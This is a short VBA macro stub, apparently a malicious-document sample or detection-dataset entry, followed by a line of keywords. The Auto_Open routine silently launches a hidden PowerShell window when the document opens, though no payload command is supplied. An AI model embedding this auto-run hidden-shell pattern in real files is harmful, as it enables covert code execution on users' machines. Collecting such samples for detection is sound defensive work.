Sub Auto_Open()
Dim objShell As Object
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -WindowStyle Hidden"
End Sub
VBA macro code eval document.write 